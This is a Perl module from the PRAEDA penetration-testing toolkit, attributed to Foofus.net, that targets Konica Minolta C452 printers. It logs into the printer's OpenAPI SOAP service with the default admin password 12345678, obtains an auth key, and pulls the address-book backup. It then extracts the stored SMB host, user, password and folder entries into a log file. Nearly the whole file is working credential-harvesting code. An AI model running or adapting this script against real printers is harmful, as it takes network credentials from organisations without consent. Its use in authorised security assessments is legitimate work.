# Minolta Konica C452
######################################################
#                PRAEDA Module #MP0020               #
#           Copyright (C) 2013 Foofus.net            #
#              Deral 'percX' Heiland                 #
######################################################
package MP0020;
sub MP0020
{

# Set global variables
my $count = 1;
my $TARGET = $_[1];
my $PORTS = $_[2];
my $web = $_[3];
my $OUTPUT = $_[4];
my $LOGFILE = $_[5];
my $key = "";
my $port = "50001";

# Open output file for loging
open(OUTFILE, ">>./$OUTPUT/$LOGFILE.log") || die("Failed to open  Output file $OUTPUT \n");
     print "\n**********Attempting credential extraction from Minolta Konica C452 $TARGET : JOB MP0020**********\n";
     print OUTFILE "\n**********Attempting credential extraction from Minolta Konica C452 $TARGET : JOB MP0020**********\n";
my $browser = LWP::UserAgent->new();

# call port check subroutine
        my ( $status ) =
        check_port( $TARGET, $port );
if ( $status == $SOCKET_IS_UP )
     {
      $PORTS = "50001";
      $web = "";
     }
else
     {
      $POSTS = "50003";
      $web ="s";
     }
#Sending XML auth data to return AuthKey---------------------------------------------------------

my $message ='<SOAP-ENV:Envelope
	       xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
               xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
               xmlns:xsd="http://www.w3.org/2001/XMLSchema">
               <SOAP-ENV:Header><me:AppReqHeader
               xmlns:me="http://www.konicaminolta.com/Header/OpenAPI-4-2">
               <ApplicationID xmlns="">0</ApplicationID>
               <UserName xmlns=""></UserName>
               <Password xmlns=""></Password>
               <Version xmlns=""><Major>4</Major><Minor>2</Minor></Version>
               <AppManagementID xmlns="">0</AppManagementID>
               </me:AppReqHeader></SOAP-ENV:Header>
               <SOAP-ENV:Body><AppReqLogin xmlns="http://www.konicaminolta.com/service/OpenAPI-4-2">
               <OperatorInfo><UserType>Admin</UserType><Password>12345678</Password></OperatorInfo>
               <TimeOut>60</TimeOut>
               </AppReqLogin>
               </SOAP-ENV:Body>
               </SOAP-ENV:Envelope>';

my $userAgent = LWP::UserAgent->new();
my $request = HTTP::Request->new(POST => "http$web://$TARGET:$PORTS/OpenAPI");
$request->content($message);
my $response = $userAgent->request($request);

#parse response data for AuthKey
if($response->code == 200) 
{
  print "Default credintials enabled admin/12345678\n";
  print OUTFILE "Default credintials enabled admin/12345678\n";
  my $xml_string = $response->as_string;

	foreach my $chunk (split(/<e:Envelope/,$xml_string))
               {
                ($key)=($chunk=~m|<AuthKey>(.*)</AuthKey>\s*|);
                # print "$key\n";
               }
# Sending XML password information extract request----------------------------------------------

	my $message1 ="<SOAP-ENV:Envelope
        	        xmlns:SOAP-ENV='http://schemas.xmlsoap.org/soap/envelope/'
                	xmlns:SOAP-ENC='http://schemas.xmlsoap.org/soap/encoding/'
               		xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
               	 	xmlns:xsd='http://www.w3.org/2001/XMLSchema'>
                	<SOAP-ENV:Header><me:AppReqHeader
                	xmlns:me='http://www.konicaminolta.com/Header/OpenAPI-4-2'>
                	<ApplicationID xmlns=''>0</ApplicationID>
                	<UserName xmlns=''></UserName>
                	<Password xmlns=''></Password>
                	<Version xmlns=''><Major>4</Major>
                	<Minor>2</Minor></Version>
                	<AppManagementID xmlns=''>1000</AppManagementID>
                	</me:AppReqHeader></SOAP-ENV:Header>
                	<SOAP-ENV:Body><AppReqGetAbbr xmlns='http://www.konicaminolta.com/service/OpenAPI-4-2'>
                	<OperatorInfo>
                	<AuthKey>$key</AuthKey>
                	</OperatorInfo><AbbrListCondition>
                	<SearchKey>None</SearchKey>
                	<WellUse>false</WellUse>
                	<ObtainCondition>
                	<Type>OffsetList</Type>
                	<OffsetRange><Start>1</Start><Length>100</Length></OffsetRange>
                	</ObtainCondition>
                	<BackUp>true</BackUp>
                	<BackUpPassword>MYSKIMGS</BackUpPassword>
                	</AbbrListCondition></AppReqGetAbbr>
                	</SOAP-ENV:Body></SOAP-ENV:Envelope>";

	my $userAgent = LWP::UserAgent->new();
	my $request = HTTP::Request->new(POST => "http$web://$TARGET:$PORTS/OpenAPI");
	$request->content($message1);
	my $response = $userAgent->request($request);

	#parse response data for password
	if($response->code == 200)
	{
  	my $xml_string1 = $response->as_string;
  	print "Starting SMBMODE Credentials Extract \n";     
        print OUTFILE "SMBMODE Credintials=\n";
  	      foreach my $chunk (split(/<SmbMode>/,$xml_string1))
        	       {
               	 	($host,$user,$pwd,$fldr)=($chunk=~m|<Host>(.*)</Host>\s*<User>(.*)</User>\s*<Password>(.*)</Password>\s*<Folder>(.*)</Folder>|);
                 	# print "Host=$host, Username=$user, Password=$pwd, Folder=$fldr\n";
			print OUTFILE "Host=$host, Username=$user, Password=$pwd, Folder=$fldr\n";
               	       }
	}
	else
	{
	  print $response->error_as_HTML;
	}


}
elsif($response->code == 500)
{
  print "Default password hash been changed\n";
}
else 
{
  print $response->error_as_HTML;
}
# operation completed close out output files
close(OUTFILE);


#port check sub routeen----------
#tcp port check routine
 sub check_port {
  my ( $TARGET ) = @_;
  my $status = $SOCKET_IS_DOWN;
  my $socket = IO::Socket::INET->new(
    PeerAddr => $TARGET,
    PeerPort => $port,
    Timeout => $REQUEST_TIMEOUT
    );


 if ( defined $socket )
     {
      sleep $WAIT_FOR_RST;
      my $is_connected = $socket->connected;

         if ( defined $is_connected )
            {
            $status = $SOCKET_IS_UP;
            }
     }
return ( $status);
}





}
1;
